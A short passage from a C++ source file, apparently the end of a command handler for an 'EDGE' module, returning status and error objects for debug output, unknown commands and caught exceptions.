            return {{"status", "success"}, {"debug", debugInfo}};
            
        } else {
            return {
                {"status", "error"},
                {"module", "EDGE"},
                {"message", "Unknown command: " + command}
            };
        }
        
    } catch (const std::exception& e) {
        return {
            {"status", "error"},
            {"module", "EDGE"},
            {"message", e.what()}
        };
    }
}